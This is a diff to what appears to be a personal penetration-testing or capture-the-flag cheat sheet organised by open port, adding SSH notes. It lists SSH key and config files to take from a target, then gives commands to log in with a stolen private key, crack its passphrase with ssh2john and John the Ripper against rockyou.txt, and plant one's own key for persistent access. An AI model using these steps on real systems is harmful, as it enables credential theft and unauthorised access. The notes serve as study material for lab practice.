@@ -30,8 +30,26 @@ WHICH PORTS ARE OPEN
                                             /home/user/.ssh/id_dsa  -  .pub
                                             /home/user/.ssh/id_ecdsa  -  .pub
                                             /home/user/.ssh/id_ed25519  -  .pub
-                            AND ETC...
+                            AND ETC... MAYBE   ssh_config
+                                               sshd_config
+                                               authorized_keys
+                                               ssh_known_hosts
+                                               known_hosts
+                                               id_rsa
+
+                            AFTER GOT THE FILE you may need to crack it!
+                            FIRST 
+                                sudo chmod 600 user_id_rsa or pub
+                                ssh -i user_id_rsa user@$IP -p 2222
+                            if it asked passphrase you should crack it use 
+                                ssh2john user_id_rsa > user.hash
+                                john user.hash --wordlist=/usr/share/wordlist/rockyou.txt
+                            also you can check hashcat mode if you see any error but don't forget if it takes so long you do something wrong
+                            also check 
+                                ~/.john/john.pot
+                            IF THERE IS AN ISSUE STILL CHECK OTHER FILES MAYBE THERE ARE SOME RULES YOU NEED TO USE IT!                              
                             BUT DON't FORGET THIS IS NOT ONLY FOR STEALING BUT ALSO GIVING YOUR SELF AUTHORIZATION
+                                ssh-keygen      
                             
   21 - FTP
   
